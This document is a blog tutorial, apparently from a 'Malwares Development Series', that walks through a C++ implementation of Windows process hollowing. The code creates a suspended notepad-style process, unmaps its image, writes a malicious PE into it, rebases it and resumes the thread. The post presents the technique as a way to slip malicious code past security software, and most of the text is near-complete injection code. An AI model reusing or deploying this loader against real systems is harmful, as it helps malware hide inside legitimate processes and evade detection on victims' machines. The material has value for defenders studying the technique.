---
title: 'Malwares Development Series | Part 3 : Process Injection | Process Hollowing'
published: 2024-07-29
description: ''
image: ''
tags: ['Malwares', 'CTF', 'Forensics', 'DFIR', 'RedTeam', 'BlueTeam', 'APT', 'Threat Hunting']
category: 'Malwares'
draft: false 
---

Hello, as a continuaton on our walkthrough about malwares techniques, Today we will cover the Process Hollowing technique.
During this blog, we'll follow this plan :

- **What is Process Hollowing ?**
- **How Process Hollowing works ?**
- **Process Hollowing Implementation**

Note : This Technique requires a deep understanding to Windows Process Mechanisms like PEB and MEMORY stuffs, So i recommende you to go take a look on them.

So let's begin

## What is Process Hollowing

First, we need to clarify the term "Hollowing", "Hollowed out" in the context of process hollowing refers to the act of removing or unmapping the legitimate code from a process's memory space and replacing it with malicious code.

So we can say that Process hollowing is a technique used to inject malicious code into a legitimate process. The process is essentially "hollowed out" and replaced with malicious code, which then runs under the guise of the legitimate process. Guess what, This technique is often used to evade detection by security software because the malicious code is running within a process that appears legitimate. Interesting huh ?

## How Process Hollowing works ?

The Process Hollowing operates on six important steps which are :

- **Create a Suspended Process**

First, we create a new instance of a legitimate process (e.g., notepad.exe) in a suspended state using CreateProcess with the CREATE_SUSPENDED flag. This means the process is created but not yet executed.

- **Unmap the Process's Memory**

Then, we use ZwUnmapViewOfSection or a similar API call to unmap the memory of the main executable image of the suspended process. This effectively "hollows out" the process.

- **Allocate Memory in the Process**
    
Allocates memory within the hollowed-out process using VirtualAllocEx.

- **Write Malicious Code to the Process**

We write the malicious code or the new executable image into the allocated memory of the suspended process using WriteProcessMemory.

- **Adjust Base Adresses ( The hard part )**

The purpose of this process is to ensure that all addresses within the loaded image are correctly adjusted to reflect the new base address in memory. This is necessary because the image may not always be loaded at its preferred base address, requiring relocation to function correctly.

- **Set Entry Point**
    
We modifie the entry point of the suspended process to point to the malicious code. This can be done by modifying the PEB (Process Environment Block) structure or by changing the CONTEXT of the process.

- **Resume the Process**
    
Finally, we need to resume the suspended process using ResumeThread. The process starts executing the malicious code instead of the original legitimate code.

## C++ Implamentation

Starting with importing the necessary libraries :

```cpp
#include <windows.h>
#include "internals.h"
#include "pe.h"
```

### Suspended Process Creation

So as we said we should create a new instance of a legitimate process ( Notepade ) in a suspended state, why, because we should unmap its original code and replace it with our malicious one before the execution of its main thread.

Let us create a function named ```CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)``` , The pSourceFile is our malicious code (PE).
```cpp
void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile){

    LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
    LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
    
    CreateProcessA(
        0,
        pDestCmdLine,      
        0, 
        0, 
        0, 
        CREATE_SUSPENDED, 
        0, 
        0, 
        pStartupInfo, 
        pProcessInfo
    );

    if (!pProcessInfo->hProcess)
    {
        printf("Error creating process\r\n");
        return;
    }
}
```
So as you can see there is two new structures that I used, STARTUPINFOA and PROCESS_INFORMATION, which are two crucial structures that provide information about the startup configuration and state of the new process and its primary thread.

You can find more a about them in Windows APIs documentation here [STARTUPINFOA]('https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa') and here [PROCESS_INFORMATION]('https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information')

### Unmap the target process's memory

So after creating the suspended process, let's Unmap it.

```cpp
    PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);
    PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);

    printf("Opening source image\r\n");

    HANDLE hFile = CreateFileA(
        pSourceFile,
        GENERIC_READ, 
        0, 
        0, 
        OPEN_ALWAYS, 
        0, 
        0
    );

    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("Error opening %s\r\n", pSourceFile);
        return;
    }

    DWORD dwSize = GetFileSize(hFile, 0);
    PBYTE pBuffer = new BYTE[dwSize];
    DWORD dwBytesRead = 0;
    ReadFile(hFile, pBuffer, dwSize, &dwBytesRead, 0);
    CloseHandle(hFile);
    PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);
    PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);

    printf("Unmapping destination section\r\n");

    HMODULE hNTDLL = GetModuleHandleA("ntdll");
    FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
    _NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;

    DWORD dwResult = NtUnmapViewOfSection(
        pProcessInfo->hProcess, 
        pPEB->ImageBaseAddress
    );

    if (dwResult)
    {
        printf("Error unmapping section\r\n");
        return;
    }
```

Before doing the unmaping, we should know about the PEB structure, the PEB is a data structure in the Windows operating system that holds information about a process. It includes details such as loaded modules, heap addresses, and the process image base address. Accessing the PEB of a target process is necessary to retrieve this critical information.

So let's take a pointer on the PEB with ReadRemotePEB() and load Image base address from it using ReadRemoteImage().

The purpose of reading the base address of the executable image is to know where the executable image of the process is loaded in memory.

After this step, we should get a handle on our malicious file that we want to replace the target's memory with, using CreateFileA(), reading it's content to a buffer and converts the raw image buffer (buffer) into a LOADED_IMAGE structure, which contains parsed information about the image.

So after getting the necessary informations, we Unmapped the target's process memory with NtUnmapViewOfSection, imported from the ntdll.dll library.

Note that we didn't create our malicious file yet.

### Allocate and write malicious code

As usual, to allocate memory in the target process we use VirtualAllocEx(), so to understand the Writing of the code in the allocated memory, you should know about the structure of a PE file ( Portable Executable ). A Portable Executable (PE) file is a file format used in Windows operating systems for executables, object code, and DLLs (Dynamic Link Libraries). The format is designed so that the operating system can load and manage these files efficiently. 

This is easy right ?

let's cover some of its componants :

- **DOS Header** : This one contains a magic number (MZ) and a pointer to the NT Headers.
- **NT Headers** : Main header for the PE file, including the File Header and Optional Header.
- **Section Headers** : This one describe each section of the executable (e.g., code, data, resources).
- **Data Directories** : Pointers to other important tables and data structures, like the export, import, and relocation tables. We will see what are these things in other blogs. and we will foncus only on relocation and sections.

Here are some common Sections in PE Files.

| Section  | Purpose                                                                                 | Attributes          |
|----------|-----------------------------------------------------------------------------------------|---------------------|
| `.text`  | Contains the executable code.                                                           | Read-only, Executable |
| `.data`  | Contains initialized global and static variables.                                       | Read-write          |
| `.bss`   | Contains uninitialized global and static variables.                                     | Read-write          |
| `.rdata` | Contains read-only initialized data, such as string literals and constants.             | Read-only           |
| `.rsrc`  | Contains resource data, such as icons, menus, and dialogs.                              | Read-only           |
| `.edata` | Contains export data, including function names and addresses exported by the executable or DLL. | Read-only           |
| `.idata` | Contains import data, including names and addresses of functions and variables imported from other executables or DLLs. | Read-only           |
| `.reloc` | Contains relocation data used by the loader to adjust the base addresses of the code and data if the executable is not loaded at its preferred base address. | Read-only           |
| `.pdata` | Contains exception handling data.                                                       | Read-only           |
| `.tls`   | Contains data for thread-local storage.                                                 | Read-write          |
| `.debug` | Contains debugging information.  

So i encourage you to do your homeworks about these stuffs, now let's break down the code.

```cpp
    PVOID pRemoteImage = VirtualAllocEx(
        pProcessInfo->hProcess,
        pPEB->ImageBaseAddress,
        pSourceHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!pRemoteImage)
    {
        printf("VirtualAllocEx call failed\r\n");
        return;
    }

    printf("Writing headers\r\n");

    if (!WriteProcessMemory(
        pProcessInfo->hProcess,                 
        pPEB->ImageBaseAddress, 
        pBuffer, 
        pSourceHeaders->OptionalHeader.SizeOfHeaders, 
        0
    ))
    {
        printf("Error writing process memory\r\n");
        return;
    }

    for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
    {
        if (!pSourceImage->Sections[x].PointerToRawData)
            continue;

        PVOID pSectionDestination = (PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);

        printf("Writing %s section to 0x%p\r\n", pSourceImage->Sections[x].Name, pSectionDestination);

        if (!WriteProcessMemory(
            pProcessInfo->hProcess,            
            pSectionDestination,            
            &pBuffer[pSourceImage->Sections[x].PointerToRawData],
            pSourceImage->Sections[x].SizeOfRawData,
            0
        ))
        {
            printf("Error writing process memory\r\n");
            return;
        }
    }    
```
First, as we said before, we allocate space to contain our malicious code in the unmapped memory. we grap the size of the code to allocate from the code PE header using ``` pSourceHeaders->OptionalHeader.SizeOfImage ```.

After that, we start to write our code PE headers and sections on the allocated memory using WriteProcessMemory(), taking as parameters the pbuffer ( holds our code ) and the base adress to where it should start writing.

Starting by writing the PE headers, this part in the code explains itself by taking just the size of headers from the buffer and starting to write these headers from the adress which is the image base adress taken from the PEB  ```pPEB->ImageBaseAddress```.

```cpp
if (!WriteProcessMemory(
        pProcessInfo->hProcess,                 
        pPEB->ImageBaseAddress, 
        pBuffer, 
        pSourceHeaders->OptionalHeader.SizeOfHeaders, 
        0
    ))
    {
        printf("Error writing process memory\r\n");
        return;
    }
```
Passing now to writing the sections, the for loop iterate trought the number of sections and write each one.
Note that the line  ``` PVOID pSectionDestination = (PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress); ``` serves the updated adress where we can write the coming sections ( it's like one under one ).

### Adjust Base Adresses ( relocating : The hard part for me )

It seems like we are done !!! but no, we should adjust the base addresses of the code and data if the executable is not loaded at its preferred base address. 
The way to do this is by reconfiguring the relocation in .reloc section, dont worry if you didn't understand this, i'll make it easier, so let's get some information about .reloc section.

The .reloc section in a part of PE file contains relocation information used by the windows loader when the executable is loaded into memory. This section is crucial when the executable is not loaded at its preferred base address, requiring adjustments to certain memory addresses within the code and data.

For more understanding on why we need this relocation, When an executable is compiled, it is typically assigned a preferred base address where it expects to be loaded into memory. However, if another executable is already using that address space, the operating system will load the new executable at a different address. This is where the .reloc section comes into play.

These are some impotant topics to search about and take in consideration, now i want to ask about how really we gonna know if the relocation is necessary? the answer is quit simple, we calculate a difference called delta, it is a difference between the base addresses of the source image and the target process. If there is no difference, relocation is not necessary.

now let's implement this on our code :

```cpp
    DWORD dwDelta = (DWORD)pPEB->ImageBaseAddress - pSourceHeaders->OptionalHeader.ImageBase;
    if (dwDelta)
    {
        for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
        {
            char* pSectionName = ".reloc";        

            if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
                continue;

            printf("Rebasing image\r\n");

            DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
            DWORD dwOffset = 0;

            IMAGE_DATA_DIRECTORY relocData = pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

            while (dwOffset < relocData.Size)
            {
                PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];
                dwOffset += sizeof(BASE_RELOCATION_BLOCK);

                DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);
                PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];

                for (DWORD y = 0; y <  dwEntryCount; y++)
                {
                    dwOffset += sizeof(BASE_RELOCATION_ENTRY);

                    if (pBlocks[y].Type == 0)
                        continue;

                    DWORD dwFieldAddress = pBlockheader->PageAddress + pBlocks[y].Offset;

                    DWORD dwBuffer = 0;
                    ReadProcessMemory(
                        pProcessInfo->hProcess, 
                        (PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
                        &dwBuffer,
                        sizeof(DWORD),
                        0
                    );

                    dwBuffer += dwDelta;

                    BOOL bSuccess = WriteProcessMemory(
                        pProcessInfo->hProcess,
                        (PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
                        &dwBuffer,
                        sizeof(DWORD),
                        0
                    );

                    if (!bSuccess)
                    {
                        printf("Error writing memory\r\n");
                        continue;
                    }
                }
            }

            break;
        }
    }
```
so this part is a little bit sneaky, we just check if the delta (dwDelta) is equal 0 or not. If not, we iterate over the sections to look for the .reloc section. once we got the .reloc, we do the rebasing of image. Here is a break down of the code :

1. **Get the Address of the Relocation Section's Raw Data**

    ```cpp
    DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
    DWORD dwOffset = 0;
    ```
We start by initializing the address and offset for reading the relocation data. `dwRelocAddr` is the starting address of the raw data for the `.reloc` section, and `dwOffset` is set to zero to begin processing from the start.

2. **Get the Relocation Data Directory**

    ```cpp
    IMAGE_DATA_DIRECTORY relocData = pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    ```
This retrieve the relocation data directory from the PE file's optional header. This directory contains information about the relocation data size and virtual address.

Now lets start processing each relocation block

3. **Process Relocation Data**

    ```cpp
    while (dwOffset < relocData.Size)
    ```

    - **Purpose:** Continue processing relocation data until the end of the section.
    - **Explanation:** `relocData.Size` is the total size of the relocation data. The loop continues until `dwOffset` reaches this size.

4. **Get the Relocation Block Header**

    ```cpp
    PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];
    dwOffset += sizeof(BASE_RELOCATION_BLOCK);
    ```

now we accessing the header of the current relocation block and update the offset. `pBlockheader` points to the beginning of the relocation block header in the data buffer and `dwOffset` is incremented by the size of the block header to move to the next section of data.

5. **Calculate Number of Relocation Entries**

    ```cpp
    DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);
    PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];
    ```

After we got the `pBlockheader`, lets determine the number of relocation entries in the current block. `CountRelocationEntries` calculates how many entries are present based on the block size. `pBlocks` points to the start of these entries.

6. **Process Each Relocation Entry**

    ```cpp
    for (DWORD y = 0; y < dwEntryCount; y++)
    ```
Iterating through each relocation entry in the current block. `dwEntryCount` gives the number of entries to process. The loop index `y` is used to access each entry.

7. **Skip Non-Relocatable Entries**

    ```cpp
    dwOffset += sizeof(BASE_RELOCATION_ENTRY);
    if (pBlocks[y].Type == 0)
        continue;
    ```
We should skip entries that are not relocatable. `dwOffset` is incremented to move to the next entry. The if statement checks if the Type field of the current relocation entry is 0 (IMAGE_REL_BASED_ABSOLUTE you should read about this). A relocation type of 0 means that the entry is not relocatable and should be ignored. If the type is 0, the continue statement skips the rest of the loop's body and moves to the next iteration, effectively ignoring this entry.

Now after we get access to the entries, we should adjust adresses.

8. **Calculate the Address to be Relocated**

    ```cpp
    DWORD dwFieldAddress = pBlockheader->PageAddress + pBlocks[y].Offset;
    ```
Starting by calculating the address that needs adjustment. The `dwFieldAddress` is calculated by adding the `PageAddress` from the block header to the `Offset` from the entry.

9. **Read the Value at the Address**

    ```cpp
    DWORD dwBuffer = 0;
    ReadProcessMemory(
        pProcessInfo->hProcess, 
        (PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
        &dwBuffer,
        sizeof(DWORD),
        0
    );
    ```

Now lets read the current value from the target process memory. The `ReadProcessMemory` retrieves the value from the calculated address into `dwBuffer`.

10. **Adjust the Value by the Relocation Delta**

    ```cpp
    dwBuffer += dwDelta;
    ```

 After reading that value, we should adjust it by the relocation delta. The value read from memory is updated by adding `dwDelta` to correct the address.

11. **Write the Adjusted Value Back**

    ```cpp
    BOOL bSuccess = WriteProcessMemory(
        pProcessInfo->hProcess,
        (PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
        &dwBuffer,
        sizeof(DWORD),
        0
    );
    ```

Write the adjusted value back to the process memory. `WriteProcessMemory` updates the value at the computed address with the adjusted `dwBuffer`.

12. **Check if Write Was Successful**

    ```cpp
    if (!bSuccess)
    {
        printf("Error writing memory\r\n");
        continue;
    }
    ```

Check if the memory write operation was successful. If `bSuccess` is `FALSE`, an error message is printed, and the loop continues to the next entry.

13. **Break the Loop**

    ```c
    break;
    ```
Exit the loop once the `.reloc` section has been fully processed. This loop terminates after processing the `.reloc` section to prevent unnecessary iterations.

Now after the relocation step is completed. we should set the EntryPoint for the program. So what is this "Entry Point", The AddressOfEntryPoint is the relative address within the PE file where the execution starts. This is also specified in the Optional Header of the PE file. it is given as an RVA, meaning it is relative to the BaseAddress and it marks the starting point for execution, often where the main function or the entry function for a DLL (like DllMain) resides.

Lets implement this,

The following section of the code sets a breakpoint at the entry point of the PE file. This is done conditionally with the `#ifdef WRITE_BP` directive.

```cpp
#ifdef WRITE_BP
printf("Writing breakpoint\r\n");

if (!WriteProcessMemory(
    pProcessInfo->hProcess, 
    (PVOID)dwEntrypoint, 
    &dwBreakpoint, 
    4, 
    0
))
{
    printf("Error writing breakpoint\r\n");
    return;
}
#endif
```
The code within #ifdef WRITE_BP is included only if WRITE_BP is defined and the WriteProcessMemory() writes a breakpoint (dwBreakpoint) to the entry point (dwEntrypoint) of the target process.

Passing now to managing the thread context, After setting the breakpoint, the code retrieves and sets the thread context to modify the instruction pointer to the entry point of the PE file.

```cpp
LPCONTEXT pContext = new CONTEXT();
pContext->ContextFlags = CONTEXT_INTEGER;

printf("Getting thread context\r\n");

if (!GetThreadContext(pProcessInfo->hThread, pContext))
{
    printf("Error getting context\r\n");
    return;
}

pContext->Eax = dwEntrypoint;            

printf("Setting thread context\r\n");

if (!SetThreadContext(pProcessInfo->hThread, pContext))
{
    printf("Error setting context\r\n");
    return;
}
```
this steps involves managing the thread context to ensure proper execution of the relocated code. First, a new CONTEXT structure is allocated and initialized with CONTEXT_INTEGER to indicate that the integer registers are being modified. The GetThreadContext function is then called to retrieve the current context of the thread. Once the context is retrieved, the EAX register is set to the entry point address (dwEntrypoint), effectively setting the instruction pointer to the entry point of the relocated code. The SetThreadContext function is then used to update the thread context with these modified values. Throughout this process, any errors encountered while getting or setting the thread context are handled by printing error messages and returning from the function to ensure that issues are promptly addressed.

The last step, after setting all, is resuming the main thread.

```cpp
printf("Resuming thread\r\n");

if (!ResumeThread(pProcessInfo->hThread))
{
    printf("Error resuming thread\r\n");
    return;
}

printf("Process hollowing complete\r\n");
```


